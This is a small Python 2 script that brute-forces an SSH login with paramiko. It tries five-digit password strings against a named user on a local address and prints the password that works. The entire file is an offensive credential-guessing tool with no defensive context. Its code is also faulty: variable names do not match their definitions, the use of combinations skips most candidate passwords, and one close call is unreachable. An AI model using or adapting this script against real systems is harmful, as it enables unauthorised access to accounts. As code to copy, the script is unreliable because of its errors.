#!/usr/bin/python
import paramiko, sys, os, socket 
import itertools,string,crypt 

PASS_SIZE = 5
IP = "127.0.0.1"
USER = "rejah"
PORT=22
  
var = itertools.combinations(string.digits,PASSSIZE)
 
try:
    for i in var:
        passwd = ''.join(i)
 
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
 
        try:
            ssh.connect(IPADDRESS , port=SSHPORT, username=USERNAME, password=passwd)
            print "Connected successfully. Password = "+passwd
            break
        except paramiko.AuthenticationException, error:
            print "Incorrect password: "+passwd
            continue
        except socket.error, error:
            print error
            continue
        except paramiko.SSHException, error:
            print error
            print "Most probably this is caused by a missing host key"
            continue
        except Exception, error:
            print "Unknown error: "+error
            continue    
        ssh.close()
 
 
except Exception,error :
    print error